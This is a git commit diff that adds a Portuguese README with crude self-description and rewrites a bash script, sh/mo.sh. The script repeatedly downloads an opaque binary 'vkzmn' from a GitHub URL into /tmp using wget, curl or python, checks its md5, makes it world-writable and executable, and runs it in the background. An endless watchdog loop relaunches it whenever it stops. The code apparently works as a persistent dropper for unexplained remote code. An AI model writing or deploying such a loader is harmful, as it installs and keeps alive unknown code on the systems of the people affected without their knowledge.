1937cab307b3f7b87acff7396308a7e685c49a00
root <atilalima569@gmail.com>
2026-07-23 10:25:13 -0500

    ainda em teste

---
+++ README.md
@@ -0,0 +1,5 @@
+oi  meu nome e atila
+eu so um    progamador aspirante
+em tudo
+detonado pela vida  e por todos
+que se foda o mundo
--- sh/mo.sh
+++ sh/mo.sh
@@ -1,81 +1,103 @@
 #!//bin/bash
 
 
-
- 
-
-
 url='https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn'
+
+my_bin='vkzmn'
+
+
 
 
 execute_vkzmn() {
 
-
 chmod_ok=0
-
-
 chmod 777 /tmp/vkzmn
-
 if (( $? )) ; then
-
 echo  erro  em aplica  a permissao no vkzmn
-
 exit
-
 else 
-
 chmod_ok=1
-
 fi ; 
-
 if  (( $chmod_ok ))  ; then
-
 nohup  /tmp/vkzmn  &
-
 fi ;
 
-
-
-
 }
-
-
-down_wget() {
-
-wget   $url    -O  /tmp/vkzmn
-
-
-return
-
-
-}
-
-#####################################################
 
 
 
 check_wget() {
 
-
 command -v wget 
-
 
 if (( $? )) ; then #if last err not  0  wget not found
 
-
-echo wget  not found
-
+check_curl
 
 else
-
 
 echo  wget encontrado
 
 
-down_wget     
+wget $url -O /tmp/vkzmn
+
+echo ultimo   erro do   wget ->  $?
+
 
 
 fi;
+
+}
+
+
+
+check_curl() {
+
+
+
+command -v  curl
+
+if (( $? )) ; then 
+
+echo curl not found 
+
+check_python
+
+else 
+
+echo usando curl
+
+curl -L  $url -o /tmp/vkzmn
+
+check_file
+
+
+fi;
+
+}
+
+
+check_python(){
+
+
+command -v  python3
+
+if (( $? )) ; then
+
+echo python nao instalado
+
+
+else 
+
+echo  usando python
+
+python3 -c 'import requests ; a=requests.get( "https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn");ptr=open("/tmp/vkzmn","wb");ptr.write(a.content) '
+
+
+check_file
+
+fi ; 
+
 
 }
 
@@ -88,32 +110,18 @@ fi;
 
 
 check_file() {
-
-
 vkzmn_in_tmp=0
-
 echo verificando se vkzmn  ja esta em /tmp
-
 ls /tmp/vkzmn  
- 
 if (( $? )) ; then
-
 echo vkzmn nao esta em //tmp
-
 check_wget
-
 else 
-
 vkzmn_in_tmp=1
-
 fi ;
-
 if (( $vkzmn_in_tmp )) ; then 
-
 echo vkzmn ja esta em //tmp
-
 magic 
-
 fi;
 
 }
@@ -121,197 +129,104 @@ fi;
 
 
 magic() {  #check  if file is elf
-
-
 hash=0
-
 echo checando  a integridade do arquivo
-
 command -v  md5sum
- 
-if (( $?  )) ; then
-
+ if (( $?  )) ; then
 echo md5sum nao encontrado
-
 exit #use  od 
-
 fi;
-
 md5=$( md5sum /tmp/vkzmn )
-
-
 for  m  in $md5 ; do  
-
-
 if [[ $m = '002ab35974600f09c26abe5b15ad11f4' ]] ; then
-
 hash=1
-
 fi;
-
 done
-
-
 if (( $hash )) ; then
-
-
 echo binario conhecido
-
 execute_vkzmn
-
 fi ;
-
-
-
 if  [  $hash  -eq   0  ]   ; then 
-
-
 echo binario  desconecido
-
-
 check_wget
-
-
 fi ; 
-
 }
-
-
 # -------------------------------------------
 
 
 proc() {
-
-
 true=1000
-
 while true ; do
-
 vkzmn_ok=0
-
 dir_proc=$( ls  /proc )
- 
 for  pid  in   $dir_proc ; do
-
 if  ((  $pid  >  0  )) ; then #get only numbers
-
 comm=$( cat  /proc/$pid/comm )
- 
 for  cc in  $comm ; do
- 
 if [ $cc  =  "vkzmn" ] ; then
-
 vkzmn_ok=$true
-
 fi ; 
-
 done
-
 fi; 
-
 done
-
-
 if   [  $vkzmn_ok   -eq    $true   ]  ; then
-
 echo vkzmn_ok
-
 else 
-
 echo  vkzmn_not_ok
-
 check_file   
-
-
 fi ; 
-
 done
-
-
 } 
 
 ###############################
-
-
-
-
-
 pg() {
-
+vkzmn_ok=1
+pgrep=0
+command -v pgrep  
+if (( $? )) ; then #if last err not 0 pgrep not instaled
+echo pgrep not instaled
+proc
+else 
+pgrep=1
+fi ; 
+if [ $pgrep -eq 1 ]  ; then
+pgrep  vkzmn 
+if (( $? )) ; then
 
 vkzmn_ok=0
 
-pgrep=0
-
-
-#simple verification
-
-command -v pgrep  
-
-
-if (( $? )) ; then #if last err not 0 pgrep not instaled
-
-
-echo pgrep not instaled
- 
-
-proc
-
 else 
 
+vkzmn_ok=1
 
-pgrep=1
-
-
-fi ; 
-
-if [ $pgrep -eq 1 ]  ; then
-
-pgrep  vkzmn 
- 
-
-if (( $? )) ; then
+fi;
 
 
-echo  vkmzn nao esta em execucao
+if [  $vkzmn_ok   -eq  0  ]  ; then
 
+echo vkzmn nao  esta em execucao
 
 check_file
 
-
-else 
-
-
-echo vkzmn ja esta em execucao
-
-
 fi;
 
 
-fi;
+fi; 
 
 }
-
-
-
-
 
 
 
 
 init() {
-
-
-
 while  true ; do
+
+sleep  1
 
 pg
 
 done
-
 }
-
-
 
 
 init
